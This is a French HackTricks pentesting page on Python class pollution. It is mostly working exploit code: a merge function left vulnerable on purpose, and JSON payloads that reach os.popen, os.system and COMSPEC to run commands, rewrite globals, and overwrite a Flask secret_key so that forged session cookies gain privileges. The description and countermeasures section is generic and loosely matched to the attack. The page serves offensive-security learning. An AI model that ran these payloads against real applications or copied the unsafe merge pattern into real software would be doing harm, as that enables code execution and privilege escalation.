# Pollution de classe (Prototype Pollution de Python)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Exemple de base

Vérifiez comment il est possible de polluer les classes d'objets avec des chaînes de caractères :
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Exemple de vulnérabilité de base

Leak: Non

### Description

Python est un langage de programmation orienté objet qui permet la création de classes et d'objets. Les classes peuvent être héritées et les objets peuvent être instanciés à partir de ces classes. Python permet également la modification dynamique des classes et des objets à l'aide de la réflexion.

La pollution de classe est une vulnérabilité qui peut survenir lorsqu'un programmeur modifie dynamiquement une classe existante en y ajoutant des attributs ou des méthodes supplémentaires. Si cette modification est effectuée de manière incorrecte, elle peut entraîner des comportements inattendus dans le programme.

### Exploitation

La pollution de classe peut être exploitée en ajoutant des attributs ou des méthodes malveillants à une classe existante. Ces attributs ou méthodes peuvent être utilisés pour exécuter du code malveillant ou pour accéder à des données sensibles.

Par exemple, considérons le code suivant :

```python
class User:
    def __init__(self, username):
        self.username = username

user = User('Alice')
print(user.username)

User.password = 's3cr3t'
print(user.password)
```

Dans cet exemple, nous avons ajouté un attribut `password` à la classe `User` après avoir instancié un objet `user`. Cela permet à quiconque d'accéder à l'attribut `password` de l'objet `user`, même s'il n'a pas été défini lors de la création de l'objet.

### Contre-mesures

Pour éviter la pollution de classe, il est recommandé de ne pas modifier dynamiquement les classes existantes. Si cela est absolument nécessaire, il est important de s'assurer que les modifications sont effectuées de manière appropriée et sécurisée.

Il est également recommandé de limiter l'accès aux classes et aux objets autant que possible. Les classes et les objets sensibles doivent être protégés par des autorisations d'accès appropriées.
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


USER_INPUT = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
    }
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Exemples de gadgets

<details>

<summary>Création d'une valeur par défaut de propriété de classe pour RCE (subprocessus)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

USER_INPUT = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Pollution d'autres classes et variables globales via <code>globals</code></summary> 

</details>
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Exécution arbitraire de sous-processus</summary> 

</details>
```python
import subprocess, json

class Employee:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Surcharge de <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** est un attribut spécial de toutes les fonctions, selon la [documentation](https://docs.python.org/3/library/inspect.html) de Python, c'est une "correspondance de toutes les valeurs par défaut pour les paramètres **uniquement pour les mots-clés**". La pollution de cet attribut nous permet de contrôler les valeurs par défaut des paramètres uniquement pour les mots-clés d'une fonction, ce sont les paramètres de la fonction qui viennent après \* ou \*args.
```python
from os import system
import json

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Employee:
    def __init__(self):
        pass

def execute(*, command='whoami'):
    print(f'Executing {command}')
    system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Modification de la clé secrète Flask à travers plusieurs fichiers</summary>

Ainsi, si vous pouvez effectuer une pollution de classe sur un objet défini dans le fichier principal Python du site web, **dont la classe est définie dans un fichier différent** de celui du fichier principal. Parce que pour accéder à \_\_globals\_\_ dans les charges utiles précédentes, vous devez accéder à la classe de l'objet ou aux méthodes de la classe, vous pourrez **accéder aux globales dans ce fichier, mais pas dans le fichier principal**. \
Par conséquent, vous **ne pourrez pas accéder à l'objet global de l'application Flask** qui a défini la **clé secrète** dans la page principale:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce scénario, vous avez besoin d'un gadget pour parcourir les fichiers afin d'**accéder à l'objet global `app.secret_key`** pour changer la clé secrète de Flask et être en mesure de [**escalader les privilèges** en connaissant cette clé](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Une charge utile comme celle-ci [de ce writeup](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Utilisez cette charge utile pour **changer `app.secret_key`** (le nom dans votre application peut être différent) afin de pouvoir signer de nouveaux cookies flask avec plus de privilèges.

</details>

## Références

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
